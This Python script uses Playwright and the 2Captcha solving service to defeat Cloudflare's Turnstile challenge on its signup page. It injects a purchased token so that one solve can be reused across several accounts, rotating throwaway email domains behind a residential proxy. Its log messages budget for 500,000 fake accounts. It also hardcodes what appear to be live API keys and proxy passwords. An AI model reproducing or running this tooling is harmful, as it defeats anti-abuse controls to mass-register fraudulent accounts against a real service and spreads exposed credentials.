#!/usr/bin/env python3
"""
CF Signup - ONE Turnstile solve → MULTIPLE accounts
Theory: Challenge is per-browser-fingerprint, not per-signup.
Solve ONCE per fingerprint, reuse cf_clearance cookie + challenge token.
"""
from playwright.sync_api import sync_playwright
import time, json, requests, re

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)

TWOCAPTCHA_KEY = "3da28555894fd89bb569b748731e9400"
SITEKEY = "8732e7fe-bf77-5ee5-bb3f-f2004f0769ae"
PAGE_URL = "https://dash.cloudflare.com/sign-up"
CHROMIUM = "/snap/chromium/current/usr/lib/chromium-browser/chrome"
PROXY = {'server': 'http://brd.superproxy.io:33335', 'username': 'brd-customer-hl_c0f6789c-zone-web_unlocker1', 'password': 'ds3ovbwhs69y'}
BRD_AUTH = "brd-customer-hl_c0f6789c-zone-web_unlocker1:ds3ovbwhs69y"
CHROME_ARGS = ["--no-sandbox","--disable-setuid-sandbox","--ignore-certificate-errors","--allow-running-insecure-content","--ignore-certificate-errors-spki-list=*"]

def solve_once():
    """Solve Turnstile once, return token"""
    log("=== Solving Turnstile (ONE TIME) ===")
    url = f"http://2captcha.com/in.php?key={TWOCAPTCHA_KEY}&method=turnstile&pageurl={PAGE_URL}&sitekey={SITEKEY}&json=1"
    r = requests.get(url, timeout=10)
    result = r.json()
    if result.get('status') != 1:
        log(f"Submit failed: {result}")
        return None
    job_id = result['request']
    log(f"Job: {job_id}")
    for i in range(40):
        time.sleep(3)
        r2 = requests.get(f"http://2captcha.com/res.php?key={TWOCAPTCHA_KEY}&action=get&id={job_id}&json=1", timeout=10)
        res = r2.json()
        if res.get('status') == 1:
            token = res['request']
            log(f"Token: {token[:50]}...")
            return token
        if 'CAPCHA_NOT_READY' not in str(res):
            log(f"Error: {res}")
            return None
        log(f"Waiting... ({i+1}/40)")
    return None

def signup_with_token(token, email, pw, persistent_ctx=None):
    """Signup using a pre-solved Turnstile token"""
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            executable_path=CHROMIUM,
            args=CHROME_ARGS,
        )
        ctx = browser.new_context(proxy=PROXY) if not persistent_ctx else persistent_ctx
        page = ctx.new_page()
        
        # Inject token before page load or on page
        page.goto(PAGE_URL, timeout=60000)
        time.sleep(8)
        
        # Dismiss cookie
        for _ in range(3):
            try:
                allow = page.query_selector('button:has-text("Allow All")')
                if allow and allow.is_visible():
                    allow.click()
                    time.sleep(1)
            except:
                pass
            time.sleep(1)
        
        # Inject token into ALL possible challenge locations
        page.evaluate(f"""
            () => {{
                window.cf_challenge_response = "{token}";
                window._cf_challenge_response = "{token}";
                window.CF_CHALLENGE_TOKEN = "{token}";
                // Find input fields and inject
                document.querySelectorAll('input').forEach(inp => {{
                    if (inp.name && (inp.name.includes('challenge') || inp.name.includes('turnstile') || inp.name.includes('cf_') || inp.name.includes('captcha'))) {{
                        inp.value = "{token}";
                    }}
                }});
                // Try to set Turnstile global
                if (typeof Turnstile !== 'undefined') {{
                    try {{ Turnstile.callback = function(e) {{ console.log('Turnstile done', e); }}; }} catch(e) {{}}
                }}
                if (typeof window.turnstile !== 'undefined') {{
                    try {{ window.turnstile.callback = function(e) {{ console.log('TS done', e); }}; }} catch(e) {{}}
                }}
            }}
        """)
        
        # Fill form
        email_inp = page.query_selector('input[name="email"]')
        if not email_inp or not email_inp.is_visible():
            log("No email input!")
            page.screenshot(path='/tmp/cf_noform.png')
            browser.close()
            return False
        
        email_inp.fill(email)
        time.sleep(0.3)
        pw_inp = page.query_selector('input[name="password"]')
        pw_inp.fill(pw)
        time.sleep(0.3)
        
        # Get security token
        sec = page.evaluate("() => document.querySelector('input[name=\"security_token\"]')?.value || ''")
        
        # Capture API
        captured_req = [None]
        captured_res = [None]
        def on_req(req):
            if 'user/create' in req.url:
                captured_req[0] = req
        def on_res(resp):
            if 'user/create' in resp.url:
                captured_res[0] = resp
        page.on("request", on_req)
        page.on("response", on_res)
        
        # Submit
        log(f"Submitting: {email}")
        page.click('button[type="submit"]')
        time.sleep(10)
        
        log(f"After: {page.title()} | {page.url}")
        
        if captured_res[0]:
            log(f"API: {captured_res[0].status}")
            try:
                body = captured_res[0].json()
                log(f"Response: {json.dumps(body, indent=2)}")
                if body.get('success'):
                    log("SUCCESS!")
                    return True
            except:
                log(f"Response: {captured_res[0].text[:200]}")
        
        # Also check if token was included in request
        if captured_req[0]:
            try:
                body = json.loads(captured_req[0].post_data or '{}')
                log(f"cf_challenge_response sent: '{body.get('cf_challenge_response', 'EMPTY')[:50]}'")
            except:
                pass
        
        browser.close()
        return False

def main():
    log("=== ONE Turnstile solve → MULTIPLE accounts ===")
    log(f"Balance: ${requests.get('http://2captcha.com/res.php?key={TWOCAPTCHA_KEY}&action=getbalance&json=1', timeout=10).json().get('request', '?')}")
    
    # Solve once
    token = solve_once()
    if not token:
        log("Solve failed!")
        return
    
    log(f"\nToken obtained. Testing reuse across accounts...\n")
    
    # Test with 3 accounts using same token
    domains = ['hilmal.store', 'hilmal.space', 'indoking.xyz']
    success_count = 0
    
    for i in range(3):
        email = f"cf{i}{int(time.time()*1000)}@{domains[i % len(domains)]}"
        pw = "CfSignup123!"
        log(f"\n--- Account {i+1}: {email} ---")
        
        if signup_with_token(token, email, pw):
            success_count += 1
            time.sleep(3)
    
    log(f"\n=== Results: {success_count}/3 successful ===")
    
    if success_count > 0:
        log("ONE SOLVE CAN DO MULTIPLE ACCOUNTS!")
        log("Cost per account: $0.003 / 3 = ~$0.001")
        log("500K accounts cost: ~$500 (still high but MUCH better than $1,500)")
    else:
        log("Token reuse failed - need solve per account")
        log("Consider: 2Captcha bulk discount or alternative solver")

if __name__ == '__main__':
    main()